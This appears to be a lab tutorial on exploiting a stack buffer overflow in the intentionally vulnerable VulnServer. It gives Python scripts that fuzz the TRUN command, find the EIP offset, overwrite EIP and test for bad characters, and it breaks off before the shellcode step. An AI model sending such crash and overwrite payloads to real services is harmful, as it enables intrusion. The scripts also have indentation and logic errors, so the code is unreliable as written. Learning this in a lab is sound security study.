# Buffer Overflows
A buffer overflow occurs when memory isn't able to contain all of the data or charactrers inside of the buffer space and the data starts to spill over into the Extended Intruction Pointer (EIP) or Return Address. The return address can be used to point to addresses that it is instructed to. Steps to conduct a BoF consists of:\
- Spiking
- Fuzzing
- Finding the offset
- Overwritting the EIP
- Finding bad characters
- Finding the right module
- Getting shellcode

### Hardware/Software
- Windows VM
- VulnServer - GrayCorner
- Immunity Debugger
- generic_send_tcp

### Spiking
Spiking essentially looks for what is "breakable"

Use [generic_send_tcp](https://github.com/guilhermeferreira/spikepp/blob/master/SPIKE/src/generic_send_tcp.c) to test out with something similiar to below
s_readline();
s_string("STATS ");
s_string_variable("0");

After fuzzing the different vulnerable service commands, look at immunity debugger to find which will allow the buffer space to be over written.

### Fuzzing
Similar to spiking, but honed down to one vulnerable command, and seeing the byte place that causes the crash

```python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
      try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('<ipaddress>',<port>))
            
            s.send(('TRUN /.:/' + buffer))
            s.close()
            sleep(1)
            buffer = buffer + "A"*100
            
       except:
            print "Fuzzing crashed at %s bytes" % str(len(buffer))
            sys.exit
```

### Finding the Offset
- metasploits pattern_create can generate code to send based off of `-l` and the byte length you want
- after the code has been generated you can modify the script used during fuzzing and put it in there

```python
import sys, socket

buffer = "<pattern_create_code_here>"

      try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('<ipaddress>',<port>))
            s.send(('TRUN /.:/' + buffer))
            s.close()
            
       except:
            print "Error connecting to server"
            sys.exit
```

- from immunity, copy the code that is shown by the EIP
- use metasploit's pattern_offset with `-l length` `-q code_from_immunity`
- pattern_offset will tell you the exact byte offset to control the EIP

### Overwriting the EIP
To test the EIP overwrite, try:
```python
import sys, socket

shellcode = "A" * byte_offset + "B" * 4

      try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('<ipaddress>',<port>))
            s.send(('TRUN /.:/' + shellcode))
            s.close()
            
       except:
            print "Error connecting to server"
            sys.exit
```

- This will allow you to see the EIP over written with exactly 4 bytes. If it is not, you have the byte_offset wrong

### Finding Bad Characters
- [badchars](https://github.com/cytopia/badchars)
- copy the badchars output in your language of choice
- edit the script to match

```python
import sys, socket

badchars = PASTE_BAD_CHARS

shellcode = "A" * byte_offset + "B" * 4 + badchars

      try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('<ipaddress>',<port>))
            s.send(('TRUN /.:/' + shellcode))
            s.close()
            
       except:
            print "Error connecting to server"
            sys.exit
```
- Run this and then look at the ESP hexdump in immunity
- The goal is to find any hex that is out of place (i.e. 11 13 14)
- If hex values are displayed as something different than what it should be, those are considered bad characters and 
- When there are repetitive bad characters, say it should be 10 11 but the hex dump shows A1 A1, the only bad character is 10, not 11
- 




